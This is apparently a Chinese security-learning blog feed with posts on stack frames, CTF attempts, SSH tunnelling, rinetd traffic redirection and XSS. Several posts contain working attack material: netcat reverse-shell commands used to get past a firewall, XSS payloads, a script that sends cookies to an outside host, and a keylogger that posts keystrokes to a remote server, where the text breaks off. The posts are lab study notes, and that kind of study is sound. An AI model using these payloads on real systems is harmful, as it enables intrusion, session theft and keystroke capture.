        <content type="html"><![CDATA[<p>在编译下面这个程序的时候，我希望能够既能32位编译测试又能64位编译测试，简单折腾一下就OK了。记个笔记。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//StackFrame.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Strt</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> member1;</span><br><span class="line">    <span class="keyword">int</span> member2;</span><br><span class="line">    <span class="keyword">int</span> member3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_ADDR(x)     printf(<span class="meta-string">"&amp;"</span>#x<span class="meta-string">" = %p\n"</span>, &amp;x)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="keyword">int</span> para1, <span class="keyword">int</span> para2, <span class="keyword">int</span> para3)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> locVar1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> locVar2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> locVar3 = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Strt</span> <span class="title">tStrt</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    PRINT_ADDR(para1); <span class="comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span></span><br><span class="line">    PRINT_ADDR(para2);</span><br><span class="line">    PRINT_ADDR(para3);</span><br><span class="line">    PRINT_ADDR(locVar1);</span><br><span class="line">    PRINT_ADDR(locVar2);</span><br><span class="line">    PRINT_ADDR(locVar3);</span><br><span class="line">    PRINT_ADDR(arr);</span><br><span class="line">    PRINT_ADDR(arr[<span class="number">0</span>]);</span><br><span class="line">    PRINT_ADDR(arr[<span class="number">1</span>]);</span><br><span class="line">    PRINT_ADDR(arr[<span class="number">2</span>]);</span><br><span class="line">    PRINT_ADDR(tStrt);</span><br><span class="line">    PRINT_ADDR(tStrt.member1);</span><br><span class="line">    PRINT_ADDR(tStrt.member2);</span><br><span class="line">    PRINT_ADDR(tStrt.member3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> locMain1 = <span class="number">1</span>, locMain2 = <span class="number">2</span>, locMain3 = <span class="number">3</span>;</span><br><span class="line">    PRINT_ADDR(locMain1);</span><br><span class="line">    PRINT_ADDR(locMain2);</span><br><span class="line">    PRINT_ADDR(locMain3);</span><br><span class="line">    StackFrameContent(locMain1, locMain2, locMain3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;locMain2, <span class="number">0</span>, <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[locMain1,2,3] = [%d, %d, %d]\n"</span>, locMain1, locMain2, locMain3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>64位Ubuntu的编译运行情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&amp;locMain1 = 0x7ffd444399dc</span><br><span class="line">&amp;locMain2 = 0x7ffd444399e0</span><br><span class="line">&amp;locMain3 = 0x7ffd444399e4</span><br><span class="line">&amp;para1 = 0x7ffd4443998c</span><br><span class="line">&amp;para2 = 0x7ffd44439988</span><br><span class="line">&amp;para3 = 0x7ffd44439984</span><br><span class="line">&amp;locVar1 = 0x7ffd44439994</span><br><span class="line">&amp;locVar2 = 0x7ffd44439998</span><br><span class="line">&amp;locVar3 = 0x7ffd4443999c</span><br><span class="line">&amp;arr = 0x7ffd444399ac</span><br><span class="line">&amp;arr[0] = 0x7ffd444399ac</span><br><span class="line">&amp;arr[1] = 0x7ffd444399b0</span><br><span class="line">&amp;arr[2] = 0x7ffd444399b4</span><br><span class="line">&amp;tStrt = 0x7ffd444399a0</span><br><span class="line">&amp;tStrt.member1 = 0x7ffd444399a0</span><br><span class="line">&amp;tStrt.member2 = 0x7ffd444399a4</span><br><span class="line">&amp;tStrt.member3 = 0x7ffd444399a8</span><br><span class="line">[locMain1,2,3] = [1, 2, 3]</span><br><span class="line">[locMain1,2,3] = [1, 0, 0]</span><br></pre></td></tr></table></figure></p><p>那么32位的编译需要做以下的工作。</p><ul><li><p>确认打开多构架<br><code>dpkg --print-foreign-architectures</code><br>出现结果：i386, 就已经打开了。</p></li><li><p>打开多构架支持功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure></li><li><p>完成之后再输入<br><code>sudo apt-get install gcc-multilib g++-multilib</code></p></li><li><p>编译命令<br><code>gcc test.c -m32</code></p></li></ul><p>最后32位的编译运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&amp;locMain1 = 0xff8e84c0</span><br><span class="line">&amp;locMain2 = 0xff8e84c4</span><br><span class="line">&amp;locMain3 = 0xff8e84c8</span><br><span class="line">&amp;para1 = 0xff8e84b0</span><br><span class="line">&amp;para2 = 0xff8e84b4</span><br><span class="line">&amp;para3 = 0xff8e84b8</span><br><span class="line">&amp;locVar1 = 0xff8e8478</span><br><span class="line">&amp;locVar2 = 0xff8e847c</span><br><span class="line">&amp;locVar3 = 0xff8e8480</span><br><span class="line">&amp;arr = 0xff8e8490</span><br><span class="line">&amp;arr[0] = 0xff8e8490</span><br><span class="line">&amp;arr[1] = 0xff8e8494</span><br><span class="line">&amp;arr[2] = 0xff8e8498</span><br><span class="line">&amp;tStrt = 0xff8e8484</span><br><span class="line">&amp;tStrt.member1 = 0xff8e8484</span><br><span class="line">&amp;tStrt.member2 = 0xff8e8488</span><br><span class="line">&amp;tStrt.member3 = 0xff8e848c</span><br><span class="line">[locMain1,2,3] = [1, 2, 3]</span><br><span class="line">[locMain1,2,3] = [1, 0, 0]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>3道CTF题的尝试</title>
      <link href="/2018/05/20/3%E9%81%93CTF%E9%A2%98%E7%9A%84%E5%B0%9D%E8%AF%95/"/>
      <url>/2018/05/20/3%E9%81%93CTF%E9%A2%98%E7%9A%84%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>今天碰到了两道CTF题，解出来了一道，整理一下思路，也算学到了新东西。</p><h3 id="trojan"><a href="#trojan" class="headerlink" title="trojan"></a>trojan</h3><p>这道题题目很简单，就是说工程师发现一个远控木马的客户端程序，请分析该远程控制木马的控制端IP及端口号。</p><p>这道题附件下载下来是一个DAT文件，这我之前也没见过。但是感觉就是一个可执行文件。果然后缀改成.exe之后图标都显示出来了。</p><p>那么思路其实也很清晰，要不然就逆向，要不然就抓包。<br>逆向太麻烦了，就抓包了。<br>用了wireshark，干扰的包太多，就没成功。<br>那么我在想是不是有一款工具可以监测某个进程的网络通信情况呢，刚好我就找到了这样一款软件。AntiSpy，是一款行为监控工具。<br>那么我在虚拟机里运行了木马之后，就可以在AntiSpy软件的网络选项卡中看到本地地址本地端口和远程地址远程端口。这道题就成功解决了。<br>中间发现了一个小技巧，疑似可执行文件可以拖到DetectItEasy里面看一下。</p><h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><p>还是熟悉的套路，把图片文件binwalk一下，发现末尾是有一个rar的。<br>那么把rar分离出来。分离出来发现rar是有密码的。rar中有四个txt文件，每个TXT的大小是六个字节。<br>那么我很自然的想到应该是CRC32爆破。<br>那么弄出来python代码暴力开始破<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showTime</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> datetime.datetime.now().strftime(<span class="string">"%H:%M:%S"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">()</span>:</span></span><br><span class="line">    crcs = set([<span class="number">0x91E7241F</span>, <span class="number">0x94DD44AA</span>, <span class="number">0x69320A89</span>,<span class="number">0x9F23DB71</span>])</span><br><span class="line">    r = xrange(<span class="number">65</span>, <span class="number">91</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> r:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> r:</span><br><span class="line">                    <span class="keyword">for</span> e <span class="keyword">in</span> r:</span><br><span class="line">                        <span class="keyword">for</span> f <span class="keyword">in</span> r:</span><br><span class="line">                            txt = chr(a)+chr(b)+chr(c)+chr(d)+chr(e)+chr(f)</span><br><span class="line">                            crc = binascii.crc32(txt)</span><br><span class="line">                            <span class="keyword">if</span> (crc &amp; <span class="number">0xFFFFFFFF</span>) <span class="keyword">in</span> crcs:</span><br><span class="line">                                print(txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">showTime()</span><br><span class="line"></span><br><span class="line">crack()</span><br><span class="line"></span><br><span class="line">showTime()</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line">dic = <span class="string">r"CTF&#123;&#125;ctflg"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> x3 <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> x4 <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> x5 <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> x6 <span class="keyword">in</span> dic:</span><br><span class="line">                        s = x1+x2+x3+x4+x5+x6</span><br><span class="line">                        crc = binascii.crc32(s)&amp;<span class="number">0xFFFFFFFF</span></span><br><span class="line">                        <span class="keyword">if</span> (crc==<span class="number">0x91E7241F</span> <span class="keyword">or</span> crc==<span class="number">0x94DD44AA</span> <span class="keyword">or</span> crc==<span class="number">0x69320A89</span> <span class="keyword">or</span> crc==<span class="number">0x9F23DB71</span>):</span><br><span class="line">                            <span class="keyword">print</span> hex(crc),s</span><br></pre></td></tr></table></figure><p>但是跑起来发现不是很现实，一是很慢，二是跑出来的你不知道是不是答案。<br><code>https://www.lammertbies.nl/comm/info/crc-calculation.html?crc=12345&amp;method=ascii</code><br>一个验证CRC32的网站<br>那么思路就卡死在这了，等WP出来。<br>那我想是不是正向可以破解，有时间就把hashcat 破解不同文件的密码好好研究一下。<br>还有就是压缩包的伪加密</p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>其实还有昨天碰到的一道Base64,昨天是没有什么思路。今天知道怎么做的了。</p><p><code>AV9SB3ZLX3VFYMFIEQ==</code></p><p>就是观察全是大写字母，对于base64不太对。那么其中的一些是小写字母，通过穷举解决，有时间要搞透base64编码。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SSH简单应用</title>
      <link href="/2018/05/14/SSH%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/"/>
      <url>/2018/05/14/SSH%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a>SSH 本地端口转发</h3><p>将一本地端口与远程服务器建立隧道<br>简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。<br>2003 IP：10.10.10.130<br>Kali IP：10.10.10.144</p><h5 id="首先配置一下Kali环境。"><a href="#首先配置一下Kali环境。" class="headerlink" title="首先配置一下Kali环境。"></a>首先配置一下Kali环境。</h5><p>修改ssh的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">Port 53</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure></p><p><code>service ssh start</code><br><code>netstat -pantu | grep :53</code><br><code>service ssh restart</code></p><h5 id="内网Linux配置"><a href="#内网Linux配置" class="headerlink" title="内网Linux配置"></a>内网Linux配置</h5><p>SSH本地端口转发<br><code>ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt;user@&lt;ssh server&gt;-p&lt;ssh server port&gt;</code><br><code>ssh -L 7001:10.10.10.130:80 root@10.10.10.144 -p 53</code><br><code>http://127.0.0.1:7001</code>就可以看到2003机器80端口的网页</p><p>如果不是2003开启网页服务而是Kali本身开启网页服务，尝试一下。<br><code>service apache2 start</code><br>建立一条新的隧道<br><code>ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code><br><code>ssh -CfN -L 7002:localhost:80 root@10.10.10.144 -p 53</code><br><code>http://127.0.0.1:7002</code> 就可以看到kali的web server</p><p>那么再试一下远程桌面<br><code>ssh -CfN -L 7003:10.10.10.130:3389 root@10.10.10.144 -p 53</code><br><code>rdesktop 127.0.0.1:7003</code></p><p>-f 后台运行进程<br>-N 不执行登陆SHELL<br>-g 复用访问时作为网关，支持多主机访问本地侦听端口<br>网关模式转发RDP，NC shell<br><code>ssh -CfNg -L 7004:10.10.10.130:3389 root@10.10.10.144 -p 53</code><br>这样之后再在内网开一台XP虚拟机。<br>可以通过mstsc，连接1.1.1.3:7004，连接到2003的远程桌面。</p><h5 id="nc-shell"><a href="#nc-shell" class="headerlink" title="nc shell"></a>nc shell</h5><p>在这个场景下，把Kali和Linux只充当一个ssh隧道。<br>然后XP和2003之间nc流量通过这个SSH隧道。<br>2003：<code>nc -nvlp 3333</code><br>XP : <code>nc 1.1.1.3:7005 -e cmd</code><br>Linux : <code>ssh -CfNg -L 7005:10.10.10.130:3333 root@10.10.10.144 -p 53</code></p><p>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断<br>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</p><h3 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h3><ul><li>由于ACL等原因，SSH与应用连接建立方向相反</li><li>本地端口转发<ul><li>SSH客户端 + 应用客户端位于FW一段</li><li>SSH服务端 + 应用服务端位于另一端</li></ul></li><li>远程端口转发<ul><li>SSH客户端，应用客户端位于FW两端</li><li>SSH服务端，应用服务端位于FW两端<br>`ssh -fNg -R <listen port="">:<remote ip="">:<remote port=""> user@<ssh server=""> -p <ssh server="" port=""></ssh></ssh></remote></remote></listen></li></ul></li><li>之所以称为远程，是因为SSH侦听端口开在远程的SSH server上</li><li>侦听端口永远开在应用客户端一方<br><code>ssh -CfNg -R 7001:1.1.1.2:80 root@10.10.10.144 -p 53</code><br><code>ssh -CfNg -R 7001:1.1.1.2:3389 root@10.10.10.144 -p 53</code><br>在kali上 <a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a> 可以看到XPweb</li></ul><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a>SSH 动态端口转发</h3><ul><li>本地，远程端口转发都需要固定应用服务器IP，Port<ul><li>应用端口繁多，逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul></li><li>本地侦听Socks4/5代理端口<ul><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理（浏览器）</li><li>使用proxychains支持无代理客户端</li><li><code>ssh -CfNg -D 7001 root@1.1.1.1 -p 53</code><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a>X 协议转发</h3></li></ul></li><li>远程登陆Linux GUI运行图形化界面工具<ul><li>VNC</li><li>X Windows</li></ul></li><li>防火墙限制访问时<ul><li>基于SSH的X转发</li><li>ssh -X <a href="mailto:user@1.1.1.1" target="_blank" rel="noopener">user@1.1.1.1</a> -p 53</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>一次简单的流量重定向</title>
      <link href="/2018/05/12/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2018/05/12/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="简单的流量重定向"><a href="#简单的流量重定向" class="headerlink" title="简单的流量重定向"></a>简单的流量重定向</h1><p>首先简单介绍一下这个配置的具体情况。以下配置全在VM虚拟机下进行。<br>有四台机器，一台XP，一台kali，一台win2003，还有一个m0n0wall。<br>XP在内网环境下，通过m0n0wall过滤连接外网。只打开外出的53端口，所以无法正常访问网页。<br>Kali用来流量重定向，监听53端口，并把流量转发win2003的80端口。<br>win2003配置IIS。</p><h3 id="m0n0wall"><a href="#m0n0wall" class="headerlink" title="m0n0wall"></a>m0n0wall</h3><p>首先是配置m0n0wall的部分，一开始就碰到问题，m0n0wall的安装镜像都找不到。应该是很早就停止维护了，最后的版本大概是在2014年。我也没怎么找替代品，看到一个smallwall，但好像也停止维护了，就没有仔细研究。那么找了半天，我终于找到了m0n0wall的最后一个版本，并在虚拟机上进行了安装。<br>安装过程很快，虚拟机的配置需要给它两块网卡，一块是Host Only,另一块就是联外网的。<br>那么进入以后其实很简单，它就只有6个选项。第一个选项配置一下网卡，第二个选项设置一下LAN IP address。第三个选项重置webGUI的密码。剩下没什么可做的了。这里要注意一个问题，卡了我一下。就是需要将虚拟网络编辑器里的使用本地DHCP服务将IP地址分配给虚拟机这个选项关掉。这样XP才能由monowall的DHCP服务来分配地址。<br>接下来就是进入webGUI里面进行设置，图形化界面也十分简单。目的很简单，就是只允许53端口的出站请求。<br>以上完成之后，防火墙的部分就配置好了。</p><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h3><p>Kali的部分是用Rinetd来进行流量的重定向。首先安装Rinetd。<br><code>apt-get install rinetd</code><br>rinetd的配置文件<code>cat /etc/rinetd.conf</code><br>配置的时候输入本机IP，侦听的53端口，2003的IP，80端口。<br>运行服务<br><code>rinetd</code><br>查看启动没有<code>ps aux | grep rinetd</code><br><code>netstat -pantu | grep :53</code></p><h3 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h3><p>这里因为之前就配置了IIS服务，运行appwiz.cpl。其实就是开一个网页作为示范。就不细说了。不过可以修改一下密码方便之后的远程桌面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd\</span><br><span class="line">net user administrator *</span><br></pre></td></tr></table></figure></p><h3 id="winXP"><a href="#winXP" class="headerlink" title="winXP"></a>winXP</h3><p>XP没有什么需要配置的，它只有一块HOST ONLY网卡，被防火墙卡了以后就只有53端口的流量可以出去。如果之前的配置都成功的话。那么通过浏览器访问`<a href="http://10.10.10.144:53/发现就可以看到win2003" target="_blank" rel="noopener">http://10.10.10.144:53/发现就可以看到win2003</a> 80端口的网页。说明流量重定向成功。</p><h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>网页OK以后再来尝试一下远程桌面。<br>首先需要打开win2003的远程桌面服务。然后改变流量转发的端口，不再转发到80端口，而是3389端口。<br>修改完成之后需要重新启动rinetd。<br><code>pkill rinetd</code><br><code>rinetd</code><br>在XP上运行mstsc</p><h3 id="NC重定向获得SHELL"><a href="#NC重定向获得SHELL" class="headerlink" title="NC重定向获得SHELL"></a>NC重定向获得SHELL</h3><p>首先在kali里面是有windows版的NC，具体在<code>/usr/share/windows-binaries/nc.exe</code><br>复制到XP以及2003<br>在2003中，侦听333端口 <code>nc -nvlp 333</code><br>端口转发也需要改成333端口<br>在XP中 <code>nc 10.10.10.144 53 -e cmd</code><br>即可把cmd交给远程的2003</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>XSS漏洞等笔记</title>
      <link href="/2018/04/23/XSS%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/04/23/XSS%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ul><li><p>攻击web客户端</p></li><li><p>客户端脚本语言</p><ul><li>弹窗告警，广告</li><li>JavaScript</li><li>在浏览器中执行</li></ul></li><li><p>XSS（cross-site scripting)</p><ul><li>通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的</li><li>注入客户端脚本代码</li><li>盗取cookie</li><li>重定向</li></ul></li><li><p>VBScript, ActiveX or Flash</p></li><li><p>JavaScript</p><ul><li>与Java语言无关</li><li>命名完全出于市场原因</li><li>使用最广的客户端脚本语言</li></ul></li><li><p>使用场景</p><ul><li>直接嵌入html：<code>&lt;script&gt; alert(‘XSS’); &lt;/script&gt;</code></li><li>元素标签事件：<code>&lt;body onload=alert(‘XSS’)&gt;</code></li><li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li><li>其他标签：<code>&lt;iframe&gt;, &lt;div&gt;, and &lt;link&gt;</code></li><li>DOM对象，篡改页面内容</li></ul></li><li><p>攻击参与方</p><ul><li>攻击者</li><li>被攻击者</li><li>漏洞站点</li><li>第三方站点（攻击目标，攻击参与站）</li></ul></li><li><p>漏洞形成的根源</p></li><li><ul><li>服务器对用户提交数据过滤不严</li><li>提交给服务器的脚本被直接返回给其他客户端执行</li><li>脚本在客户端执行恶意操作</li></ul></li><li><p>XSS漏洞类型</p></li><li><ul><li>存储型（持久型）</li><li>反射型（非持久）</li><li>DOM型</li></ul></li><li><p>漏洞PoC</p></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href='' onclick=alert('xss')&gt;type&lt;/</span>a&gt;</span><br><span class="line">&lt;img src=http:<span class="comment">//1.1.1.1/a.ipg onerror=alert('xss')&gt;</span></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=‘http:<span class="comment">//1.1.1.1'&lt;/script&gt;</span></span><br><span class="line">&lt;iframe SRC=<span class="string">"http://1.1.1.1/victim"</span> height = <span class="string">"0"</span> width =<span class="string">"0"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;<span class="keyword">new</span> Image().src=<span class="string">"http://1.1.1.1/c.php?</span></span><br><span class="line"><span class="string">output="</span>+<span class="built_in">document</span>.cookie;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">document</span>.body.innerHTML=<span class="string">"&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS</span></span><br><span class="line"><span class="string">WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;"</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>窃取cookie</p></li><li><p><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></p></li><li><p>a.js</p></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://1.1.1.1/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></li><li><p>keylogger.js</p></li><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">evt = evt || <span class="built_in">window</span>.event</span><br><span class="line">key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line"><span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key)</span><br><span class="line">http.open(<span class="string">"POST"</span>,<span class="string">"http://192.168.20.8/keylogger.php"</span>,<span class="literal">true</span>);</span><br><span class="line">http.setRequestHeader(<span class="string">"Content-type"</span>,<span 